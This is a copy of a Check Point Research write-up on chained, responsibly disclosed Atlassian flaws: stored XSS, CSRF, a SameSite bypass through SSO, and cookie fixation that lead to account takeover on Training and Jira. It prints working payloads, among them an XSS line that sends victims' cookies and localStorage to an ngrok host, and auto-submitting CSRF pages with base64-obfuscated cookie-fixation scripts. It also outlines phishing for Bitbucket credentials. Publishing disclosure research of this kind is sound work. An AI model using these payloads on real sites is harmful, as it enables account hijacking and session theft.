---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-06-24_a-supply-chain-breach-taking-over-an-atlassian-account.md
original_filename: 2021-06-24_a-supply-chain-breach-taking-over-an-atlassian-account.md
title: 'A supply-chain breach: Taking over an Atlassian account'
category: documents
detected_topics:
- xss
- cloud-security
- sso
- oauth
- jwt
- command-injection
tags:
- imported
- documents
- xss
- cloud-security
- sso
- oauth
- jwt
- command-injection
language: en
raw_sha256: 1fe3665f2834959f190194de354db262eb43029b3928f399de67adbd992cb052
text_sha256: 06af4041cf8ca464795d1d504ac250d859ad6e9850e340d973de48d53cf1aacc
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: true
---

# A supply-chain breach: Taking over an Atlassian account

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-06-24_a-supply-chain-breach-taking-over-an-atlassian-account.md
- Source Type: markdown
- Detected Topics: xss, cloud-security, sso, oauth, jwt, command-injection
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: True
- Raw SHA256: `1fe3665f2834959f190194de354db262eb43029b3928f399de67adbd992cb052`
- Text SHA256: `06af4041cf8ca464795d1d504ac250d859ad6e9850e340d973de48d53cf1aacc`


## Content

---
title: "A supply-chain breach: Taking over an Atlassian account"
page_title: "A supply-chain breach: Taking over an Atlassian account - Check Point Research"
url: "https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/"
final_url: "https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/"
authors: ["Dikla Barda, Yaara Shriki", "Roman Zaikin (@R0m4nZ41k1n)", "Oded Vanunu (@Od3dV)"]
programs: ["Atlassian"]
bugs: ["XSS", "CSRF"]
publication_date: "2021-06-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3547
---

[![](https://research.checkpoint.com/wp-content/uploads/2024/06/CPR-by-Check-Point-logo.svg)](https://research.checkpoint.com)

  * [CONTACT US](https://research.checkpoint.com/contact/)
  * [DISCLOSURE POLICY](https://research.checkpoint.com/disclosure-policy/)
  * [CHECKPOINT.COM](https://www.checkpoint.com/)
  * [UNDER ATTACK?](https://www.checkpoint.com/about-us/contact-incident-response/)

[](https://www.linkedin.com/company/check-point-software-technologies/) [](https://twitter.com/_cpresearch_) [](https://www.facebook.com/checkpointresearch/)

[![](https://research.checkpoint.com/wp-content/uploads/2024/06/CPR-by-Check-Point-logo.svg)](https://research.checkpoint.com)

  * [Latest Publications](https://research.checkpoint.com/latest-publications/)
  * [CPR Podcast Channel](https://research.checkpoint.com/cpr-podcast-channel/)
  * [AI Research](https://research.checkpoint.com/ai-research/)
  * [Web 3.0 Security](https://research.checkpoint.com/category/web3/)
  * [Intelligence Reports](https://research.checkpoint.com/intelligence-reports/)
  * Resources
  * [ThreatCloud AI](https://www.checkpoint.com/ai/)
  * [Threat Intelligence & Research](https://www.checkpoint.com/solutions/threat-intelligence-research/)
  * [Zero Day Protection](https://www.checkpoint.com/infinity/zero-day-protection/)
  * [Sandblast File Analysis](http://threatemulation.checkpoint.com/)
  * [About Us](https://research.checkpoint.com/about-us/)
  * [SUBSCRIBE](https://research.checkpoint.com/subscription/)

[](https://www.linkedin.com/company/check-point-software-technologies/) [](https://twitter.com/_cpresearch_) [](https://www.facebook.com/checkpointresearch/)

SUBSCRIBE

## CATEGORIES

  * [ AI Research 16 ](https://research.checkpoint.com/category/ai-research/)
  * [ Android Malware 23 ](https://research.checkpoint.com/category/android-malware/)
  * [ Artificial Intelligence 5 ](https://research.checkpoint.com/category/artificial-intelligence-2/)
  * [ ChatGPT 3 ](https://research.checkpoint.com/category/chatgpt/)
  * [ Check Point Research Publications 460 ](https://research.checkpoint.com/category/threat-research/)
  * [ Cloud Security 1 ](https://research.checkpoint.com/category/cloud-security/)
  * [ CPRadio 44 ](https://research.checkpoint.com/category/cpradio/)
  * [ Crypto 2 ](https://research.checkpoint.com/category/crypto/)
  * [ Data & Threat Intelligence 2 ](https://research.checkpoint.com/category/data-threat-intelligence/)
  * [ Data Analysis 0 ](https://research.checkpoint.com/category/data-analysis/)
  * [ Demos 22 ](https://research.checkpoint.com/category/demos/)
  * [ Global Cyber Attack Reports 412 ](https://research.checkpoint.com/category/threat-intelligence-reports/)
  * [ How To Guides 13 ](https://research.checkpoint.com/category/how-to-guides/)
  * [ Ransomware 5 ](https://research.checkpoint.com/category/ransomware/)
  * [ Russo-Ukrainian War 1 ](https://research.checkpoint.com/category/russo-ukrainian-war/)
  * [ Security Report 1 ](https://research.checkpoint.com/category/security-report/)
  * [ Threat and data analysis 0 ](https://research.checkpoint.com/category/threat-and-data-analysis/)
  * [ Threat Research 175 ](https://research.checkpoint.com/category/threat-research-2/)
  * [ Web 3.0 Security 11 ](https://research.checkpoint.com/category/web3/)
  * [ Wipers 0 ](https://research.checkpoint.com/category/wipers/)

![](https://research.checkpoint.com/wp-content/uploads/2021/06/CPR_blog_article.jpg)

# A supply-chain breach: Taking over an Atlassian account

June 24, 2021 

[](https://www.linkedin.com/shareArticle?mini=true&url=https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/ -  https://research.checkpoint.com/?p=25129;source=LinkedIn "Share on LinkedIn!") [](http://www.facebook.com/sharer.php?u=https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/ - https://research.checkpoint.com/?p=25129  "Share on Facebook!") [](http://twitter.com/home/?status=A supply-chain breach:  Taking over an Atlassian account - https://research.checkpoint.com/?p=25129 via @kenmata  "Tweet this!")

https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/

Research By: Dikla Barda, Yaara Shriki, Roman Zaikin and Oded Vanunu

# Background

With more than 180,000 customers globally, and millions of users, the Australian 2002 founded company “Atlassian” develops products for software developers, project managers and other software related teams that uses the platform for data collaboration and information sharing.

While workforces globally turned to remote work as a result of the outbreak of COVID-19, tools such as the ones offered by Atlassian became more popular and critical for teams while the need for a seamless transition to a new work mode became a global necessity.

Atlassian, referring to this as “The Rise of Work Anywhere”, conducted a [research](https://investors.atlassian.com/financials-and-filings/news/news-details/2020/The-Rise-of-Work-Anywhere-New-Atlassian-Research-Uncovers-the-Everyday-Truths-of-Employees-During-the-Pandemic/default.aspx) about the nature of remote work during the Pandemic. The study surveyed more than 5,000 participants in Australia, France, Germany, Japan, and the US, and shows how the nuances of modern work have been amplified, demanding a shift in the way organizations manage an increasingly distributed workforce.

# Breaking on through the Platform

On November 16, 2020 Check Point Research (CPR) uncovered chained vulnerabilities that together can be used to take over an account and control some of Atlassian apps connected through SSO, Some of the affected domains are:

  * jira.atlassian.com
  * confluence.atlassian.com
  * getsupport.atlassian.com
  * partners.atlassian.com
  * developer.atlassian.com
  * support.atlassian.com
  * training.atlassian.com

What makes a supply chain attack such as this one so significant is the fact that once the attacker leverages these vulnerabilities and takes over an account, he can plant backdoors that he can use in the future for his attack. This can create a severe damage which will be identified and controlled only much after the damage is done.

_**Check Point Research responsibly disclosed this information to the Atlassian teams which and a solution was deployed to ensure its users can safely continue to share info on the various platforms**_

# Deep Dive

Atlassian uses SSO (Single Sign-On) to navigate between Atlassian products such as JIRA, Confluence and Partners.

Atlassian implements various web security measures such as CSP, SameSite “Strict” cookies and HttpOnly cookies. We had to bypass these security methods using a combination of several attack techniques. Overall we were able to achieve Full Account Take-Over.

First, we had to find a way to inject code into Atlassian – which we used the XSS and CSRF for. Then, using this code injection, we were able to add a new session cookie to the user’s account, and by combining the session fixation vulnerability in Atlassian domains, we were able to take over accounts.

Let us dive in into the first bug we found:

## XSS

The first security issue was found on the subdomain **training.atlassian.com**. The Training platform offers users courses or credits.  
We noticed that the Content Security Policy (CSP) was configured poorly on this subdomain with ‘unsafe-inline’ and ‘unsafe-eval’ directives which allows script execution. This makes this subdomain a perfect starting point for our research

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-1-1024x286.png)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-1/)

We examined the request parameters when adding courses and credits to the shopping cart. We found that when the item type is “**training_credit** ”, an additional parameter called “**options._training_credit_account** ” is added to request. This parameter was found vulnerable to XSS.

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-2.png)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-2/)

Let’s test a simple payload to receive all of the user’s cookies and local storage:

**`"><svg/onload="window.location.href=`//7a4389292a5d.ngrok.io?l=${JSON.stringify(localStorage)}&c=${document.cookie}`">`**

**It works!**

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-3.jpg)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-3/)

And we received all the cookies and the local storage of the target:

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-4.png)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-4/)

## CSRF

Since the Stored XSS can only be run when adding items to the shopping cart, we needed to make the user add a malicious item without their notice. Then, because there is no CSRF token we could perform CSRF attack on the shopping list and execute our payload.

In order to achieve that, we uploaded the following POC to our servers and sent it to the victim:

**`<html>`**

** <head></head>**

** <body onload=”document.forms[0].submit()”>**

** <form method=”post” action=”https://training.atlassian.com/cart”>**

** <input type=”hidden” name=”itemType” value=’training_credit’>**

** <input type=”hidden” name=”itemId” value=’1′>**

** <input type=”hidden” name=”options._quantity” value=’10’>**

** <input type=”hidden” name=”options._training_credit_account” value='”><svg/onload=”window.location.href=`//7a4389292a5d.ngrok.io?l=${JSON.stringify(localStorage)}&c=${document.cookie}`”>’>**

** <input type=”hidden” name=”action” value=’add’>**

** </form>**

** </body>**

**< /html>**

However, some of the cookies related to the session of the victim are set to SameSite “Strict” which means the browser prevents them from being sent to the backend.

Surprisingly, we found that during the SSO process those missing cookies are completed by the backend which will essentially bypass the SameSite “Strict” for us.

## SameSite “Strict” Bypass

We will now describe the SSO flow. We start with the XSS payload from our origin <https://7a4389292a5d.ngrok.io>:

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-5.png)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-5/)

During the SSO flow, the user gets redirected several times to different paths, such as: /auth/cart ,login.html, etc. Throughout the redirect process, the user goes through the authentication process, which adds the missing cookies that we needed and were protected by SameSite.  
Because our payload was Stored XSS it was stored in the database and was added to the Shopping List. Here we can see that the payload was injected successfully into the page:

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-6.png)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-6/)

And the malicious item was added to the shopping cart:

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-7.jpg)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-7/)

At this step we bypassed SameSite “Strict” for CSRF and CSP with inline JavaScript.

However, the more interesting cookie is **JSESSIONID** which is protected by “**HttpOnly** ” and we can’t hijack it via JavaScript.

At this point we can perform actions on behalf of the user but not login to his account. We dived in further into the SSO flow in order to find another flaw in the process.

## HTTPOnly Bypass and Cookie Fixation

**What is cookie fixation?**

Cookie Fixation is when an attacker can remotely force the user to use a session cookie known to him, which becomes authenticated.

Initially, when the user browses to the login page, the server generates a new session cookie with ‘path=/’ flag. That cookie isn’t associated with any account and only after the user passes the authentication process that same cookie will be associated to his account.

We knew that using the XSS we couldn’t get the user’s session cookie, since it was protected by HTTPOnly flag. Instead, we could create a new forged one. The newly created JSESSION cookie has the same flags as the original, with one major change – the path flag.

The original path flag is set to the root directory. We were wondering what would happen if we change it to a more a particular path. It turns out that our path will have priority since it is more specific and will be used instead of the original.

We changed the path to the exact directive we know the user will get redirected to after authentication which causes the backend to authorize our cookie over the original one.

By using cookie fixation, we bypassed the HTTPOnly and hijacked the user’s Atlassian account. We will demonstrate that on the following subdomains:

### Training.atlassian.com

We started by navigating to the **training.atlassian.com** URL from a clean browser without any cache to get a new clean **JSESSIONID** cookie.

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-8-1024x299.png)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-8/)

Now, we have a JSESSIONID without any information in it at the backend. If we will send a request to the user profile page we will be redirected to the login page.

We will now perform a Cookie Fixation on the target which will force him to use the forged Cookie by using the following steps:

We start by modifying our payload and adding the following cookie:
  
  
  document.cookie = "JSESSIONID= 5B09C73BF13FE923A2E5B4EE0DAD30E3; Domain=training.atlassian.com; Path=

**/auth0** ; Secure”

Note that the original HttpOnly cookie was set for the path “/”, but the new cookie we are setting in the payload is for the path “/auth0”. Browsing to /auth0, there are 2 cookies: the real one and ours. Ours will “win” in this case because it’s more specific.

We will use the following redirect to trigger the Auth with this cookie instead of the real one. The interesting parameter here is the **“redirect_uri=https://training.atlassian.com/auth0”** which will force the authentication for **training.atlassian.com** :

``location.href="https://atlassianuni-learndot.auth0.com/authorize?``**redirect_uri=https://training.atlassian.com/auth0**`&client_id=O7FdHY647VvbCTphBGmvfBt2GdgnH7MR&audience=https%3A%2F%2Fatlassianuni-learndot.auth0.com%2Fuserinfo&scope=openid%20profile%20email&response_type=code&state=HxElpPySsrRuKcYbFOlp9QkLZQ7kwDOemX7Dc-5dnlk"`

This auth request will associate our cookie to the target account.

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-9-1024x418.png)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-9/)

So now that we can control the **JSESSIONID** , we combined all of this steps and crafted the following payload:

`<html>`

<head></head>

<body onload=”document.forms[0].submit()”>

<form method=”post” action=”https://training.atlassian.com/cart”>

<input type=”hidden” name=”itemType” value=’training_credit’>

<input type=”hidden” name=”itemId” value=’1′>

<input type=”hidden” name=”options._quantity” value=’10’>

<input type=”hidden” name=”options._training_credit_account” value='”><svg/onload=”eval(atob`ZG9jdW1lbnQuY29va2llPSJKU0VTU0lPTklEPTVCMDlDNzNCRjEzRkU5MjNBMkU1QjRFRTBEQUQzMEUzOyBEb21haW49dHJhaW5pbmcuYXRsYXNzaWFuLmNvbTsgUGF0aD0vYXV0aDA7IFNlY3VyZSI7IHNldFRpbWVvdXQoZnVuY3Rpb24oKXsgbG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9hdGxhc3NpYW51bmktbGVhcm5kb3QuYXV0aDAuY29tL2F1dGhvcml6ZT9yZWRpcmVjdF91cmk9aHR0cHM6Ly90cmFpbmluZy5hdGxhc3NpYW4uY29tL2F1dGgwJmNsaWVudF9pZD1PN0ZkSFk2NDdWdmJDVHBoQkdtdmZCdDJHZGduSDdNUiZhdWRpZW5jZT1odHRwcyUzQSUyRiUyRmF0bGFzc2lhbnVuaS1sZWFybmRvdC5hdXRoMC5jb20lMkZ1c2VyaW5mbyZzY29wZT1vcGVuaWQlMjBwcm9maWxlJTIwZW1haWwmcmVzcG9uc2VfdHlwZT1jb2RlJnN0YXRlPUh4RWxwUHlTc3JSdUtjWWJGT2xwOVFrTFpRN2t3RE9lbVg3RGMtNWRubGsiIH0sMzAwMCk7`)”>’>

<input type=”hidden” name=”action” value=’add’>

</form>

</body>

</html>

<!–

// Payload Explain

btoa(‘ document.cookie=”JSESSIONID=5B09C73BF13FE923A2E5B4EE0DAD30E3; Domain=training.atlassian.com; Path=**/auth0** ; Secure”; setTimeout(function(){ location.href=”https://atlassianuni-learndot.auth0.com/authorize?redirect_uri=https://training.atlassian.com/auth0&client_id=O7FdHY647VvbCTphBGmvfBt2GdgnH7MR&audience=https%3A%2F%2Fatlassianuni-learndot.auth0.com%2Fuserinfo&scope=openid%20profile%20email&response_type=code&state=HxElpPySsrRuKcYbFOlp9QkLZQ7kwDOemX7Dc-5dnlk” },3000); ‘);

–>

The Cookie Fixation combined with the XSS and CSRF bugs allowed us to perform full Account Take-Over on Atlassian Training Platform.

With the same flow and Cookie Fixation we can navigate to other Atlassian products, for example, **jira.atlassian.com**

****

### Jira.atlassian.com

To hijack Jira accounts with the same flow, we first need to create a session cookie to perform Cookie Fixation. We log in to **jira.atlassian.com** and take the following cookies:

  * JSESSIONID
  * AWSALB

In order to use these cookies for the Cookie Fixation the attacker needs to sign-out from his account to get clean JSESSIONID. We can verify that the cookie is not associated with any account anymore by sending a request to ViewProfile:

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-10-1024x328.jpg)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-10/)

Next, we will modify our payload, we will perform the same method as we did in training.atlassian.com:

document.cookie=”**JSESSIONID** =1672885C3F5E4819DD4EF0BF749E56C9; Domain=.atlassian.com; Path=**/plugins** ; Secure;”

document.cookie=”**AWSALB** =iAv6VKT5tbu/HFJVuu/dTE7R80wQXNjR+0opVbccE0zIadORJVGMZxCUcTIglL3OZ/A54eu/NDNLP5I3zE+WcgGWDHpv17SexjFBc1WYA9moC4wEmPooEE/Uqoo2; Domain=.atlassian.com; Path=/plugins/; Secure;”

Note that the original HTTPOnly cookie was set for the path “/”, but the new cookie we are setting is for the path “/plugins”. Browsing to /auth0, there are 2 cookies: the real one and ours. Ours will “win” in this case because it’s a path cookie.

We will use the following redirect to trigger the Auth with this cookie instead of the real one. The interesting parameter here is the **“redirect_uri=https://jira.atlassian.com/plugins”** which will force the authentication for **jira.atlassian.com** and redirect us to /plugins.

location.href=”https://auth.atlassian.com/authorize?**redirect_uri=https://jira.atlassian.com/plugins/servlet/authentication/auth_plugin_original_url%3Dhttps%253A%252F%252Fjira.atlassian.com%252F** &client_id=QxUVh9tTugoLC5cgY3Vjkz3h1jPSvG9p&scope=openid+email+profile&state=4118f57f-a9d9-4f6d-a1d5-add939762f23&response_type=code&prompt=none”This auth request will associate our cookie to the target account.

As can be seen in the following request, the cookie is now assosiated to the target user (“John Doe” in this case).

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-11-1024x404.jpg)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-11/)

So now that we can control the **JSESSIONID** , we combined all of this steps and crafted the following payload:

`<html>`

<head></head>

<body onload=”document.forms[0].submit()”>

<form method=”post” action=”https://training.atlassian.com/cart”>

<input type=”hidden” name=”itemType” value=’training_credit’>

<input type=”hidden” name=”itemId” value=’1′>

<input type=”hidden” name=”options._quantity” value=’10’>

<input type=”hidden” name=”options._training_credit_account” value='”><svg/onload=”eval(atob`ZG9jdW1lbnQuY29va2llPSJKU0VTU0lPTklEPTE2NzI4ODVDM0Y1RTQ4MTlERDRFRjBCRjc0OUU1NkM5OyBEb21haW49LmF0bGFzc2lhbi5jb207IFBhdGg9L3BsdWdpbnM7IFNlY3VyZTsiOyAgZG9jdW1lbnQuY29va2llPSJBV1NBTEI9aUF2NlZLVDV0YnUvSEZKVnV1L2RURTdSODB3UVhOalIrMG9wVmJjY0UweklhZE9SSlZHTVp4Q1VjVElnbEwzT1ovQTU0ZXUvTkROTFA1STN6RStXY2dHV0RIcHYxN1NleGpGQmMxV1lBOW1vQzR3RW1Qb29FRS9VcW9vMjsgRG9tYWluPS5hdGxhc3NpYW4uY29tOyBQYXRoPS9wbHVnaW5zLzsgU2VjdXJlOyI7ICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vYXV0aC5hdGxhc3NpYW4uY29tL2F1dGhvcml6ZT9yZWRpcmVjdF91cmk9aHR0cHMlM0ElMkYlMkZqaXJhLmF0bGFzc2lhbi5jb20lMkZwbHVnaW5zJTJGc2VydmxldCUyRmF1dGhlbnRpY2F0aW9uJTNGYXV0aF9wbHVnaW5fb3JpZ2luYWxfdXJsJTNEaHR0cHMlMjUzQSUyNTJGJTI1MkZqaXJhLmF0bGFzc2lhbi5jb20lMjUyRiZjbGllbnRfaWQ9UXhVVmg5dFR1Z29MQzVjZ1kzVmprejNoMWpQU3ZHOXAmc2NvcGU9b3BlbmlkK2VtYWlsK3Byb2ZpbGUmc3RhdGU9NDExOGY1N2YtYTlkOS00ZjZkLWExZDUtYWRkOTM5NzYyZjIzJnJlc3BvbnNlX3R5cGU9Y29kZSZwcm9tcHQ9bm9uZSIgfSwzMDAwKTs=`);”>’>

<input type=”hidden” name=”action” value=’add’>

</form>

</body>

</html>

<!–

// Payload

btoa(‘

document.cookie=”JSESSIONID=1672885C3F5E4819DD4EF0BF749E56C9; Domain=.atlassian.com; Path=/plugins; Secure;”;

document.cookie=”AWSALB=iAv6VKT5tbu/HFJVuu/dTE7R80wQXNjR+0opVbccE0zIadORJVGMZxCUcTIglL3OZ/A54eu/NDNLP5I3zE+WcgGWDHpv17SexjFBc1WYA9moC4wEmPooEE/Uqoo2; Domain=.atlassian.com; Path=/plugins/; Secure;”;

setTimeout(function(){

location.href=”https://auth.atlassian.com/authorize?redirect_uri=https%3A%2F%2Fjira.atlassian.com%2Fplugins%2Fservlet%2Fauthentication%3Fauth_plugin_original_url%3Dhttps%253A%252F%252Fjira.atlassian.com%252F&client_id=QxUVh9tTugoLC5cgY3Vjkz3h1jPSvG9p&scope=openid+email+profile&state=4118f57f-a9d9-4f6d-a1d5-add939762f23&response_type=code&prompt=none”

},3000);

‘);

–>

The Cookie Fixation combined with the XSS and CSRF bugs from **training.atlassian.com** allowed us to perform full Account Take-Over on **Jira.atlassian.com**

### Bitbucket

Another direction we looked into was checking if we could inject malicious code to an Organization’s Bitbucket. Bitbucket is a Git-based source code repository hosting service owned by Atlassian and has more than 10 million users. Accessing a company’s Bitbucket repositories could allow attackers to access and change source code, make it public or even plant backdoors.

With a Jira account at our hands, we have a few ways to obtain Bitbucket account. One option is by opening a Jira ticket with malicious link to an attacker controlled website.

An automatic mail will be sent from Atlassian domain to the user once the ticket is created on Jira systems. An attacker can take advantage of that and include in the ticket a link to a malicious website that steals the user’s credentials.

[![](//research.checkpoint.com/wp-content/uploads/2021/06/at-12-1024x576.png)](https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-12/)

## Conclusion

By using the XSS with CSRF that we found on **training.atlassian.com** combined with the method of Cookie fixation we were able to take over any Atlassian account, in just one click, on every subdomain under atlassian.com that doesn’t use JWT for the session and that is vulnerable to session fixation . For example: training.atlassian.com, jira.atlassian.com, developer.atlassian.com and more.

Taking over an account in such a collaborative platform means an ability to take over data that is not meant for unauthorized view.

Check Point Research responsibly disclosed this information to the Atlassian teams which and a solution was deployed to ensure its users can safely continue to share info on the various platforms

### POC Video:

![](https://research.checkpoint.com/wp-content/uploads/2022/10/back_arrow.svg) GO UP 

[BACK TO ALL POSTS](/latest-publications/)

## POPULAR POSTS

[ ![](https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg) ](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

  * Artificial Intelligence
  * ChatGPT
  * Check Point Research Publications

[OPWNAI : Cybercriminals Starting to Use ChatGPT](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

[ ![](https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg) ](https://research.checkpoint.com/2019/hacking-fortnite/)

  * Check Point Research Publications
  * Threat Research

[Hacking Fortnite Accounts](https://research.checkpoint.com/2019/hacking-fortnite/)

[ ![](https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg) ](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

  * Artificial Intelligence
  * ChatGPT
  * Check Point Research Publications

[OpwnAI: AI That Can Save the Day or HACK it Away](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

### BLOGS AND PUBLICATIONS

[ ![](https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg) ](https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/)

  * Check Point Research Publications
  * Global Cyber Attack Reports
  * Threat Research

February 17, 2020

### “The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign

[ ![](https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg) ](https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/)

  * Check Point Research Publications

August 11, 2017

### “The Next WannaCry” Vulnerability is Here

[ ![](https://research.checkpoint.com/wp-content/uploads/2026/03/Handala-void-1-scaled.png) ](https://research.checkpoint.com/2026/handala-hack-unveiling-groups-modus-operandi/)

  * Check Point Research Publications

March 12, 2026

### “Handala Hack” – Unveiling Group’s Modus Operandi

[![](https://research.checkpoint.com/wp-content/uploads/2022/12/CheckPointResearchLogo_white-1-e1671590634727.png)](https://research.checkpoint.com)

[](https://www.linkedin.com/company/check-point-software-technologies/) [](https://twitter.com/_cpresearch_) [](https://www.facebook.com/checkpointresearch/)

  * Publications
  * [Global cyber attack reports](/category/threat-intelligence-reports/)
  * [Research publications](/category/threat-research/)
  * [IPS advisories](https://advisories.checkpoint.com/advisories/)
  * [Check point blog](https://blog.checkpoint.com/)
  * [Demos](/category/demos/)
  * Tools
  * [Sandblast file analysis](http://threatemulation.checkpoint.com/)
  * [ThreatCloud](https://www.checkpoint.com/infinity/threatcloud/)
  * [Threat Intelligence](https://www.checkpoint.com/solutions/threat-intelligence-research/)
  * [Zero day protection](https://www.checkpoint.com/infinity/zero-day-protection/)
  * [Live threat map](https://threatmap.checkpoint.com/)
  * [About Us](https://research.checkpoint.com/about-us/)
  * [Contact Us](https://research.checkpoint.com/contact/)

### Let’s get in touch

Subscribe for cpr blogs, news and more

[Subscribe Now](/subscription/)

© 1994-2026 Check Point Software Technologies LTD. All rights reserved.

Property of [CheckPoint.com](https://www.checkpoint.com/)

[Privacy Policy](/privacy-policy/)

![](https://research.checkpoint.com/wp-content/uploads/2022/10/popup-side-image.jpg)

## SUBSCRIBE TO CYBER INTELLIGENCE REPORTS

First Name

Last Name

Country—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlov***REDACTED-AWS-KEY***istanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK)

Email

## We value your privacy!

BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.

ACCEPT

REJECT
